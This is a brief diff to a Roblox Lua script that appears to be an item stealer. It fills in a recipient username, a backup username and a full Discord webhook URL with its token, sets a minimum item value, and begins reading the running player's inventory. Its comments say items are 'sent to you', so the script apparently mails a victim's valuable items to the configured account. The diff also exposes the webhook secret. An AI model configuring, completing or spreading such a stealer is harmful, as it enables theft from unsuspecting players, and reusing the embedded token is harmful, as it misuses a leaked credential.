@@ -1,7 +1,7 @@
-Username = "your user here"
-Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "your webhook here"
-min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+Username = "Rylkiyogami"
+Username2 = "rylkiyogami"
+Webhook = "https://discord.com/api/webhooks/1225502850923106344/PE5PBT_Q-nFpysV92dnHE8eAM4DebOXJSwx7gEexiDfjUDiZ_T9RsU590BUlYkAyO6Cm"
+min_rap = 5000
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
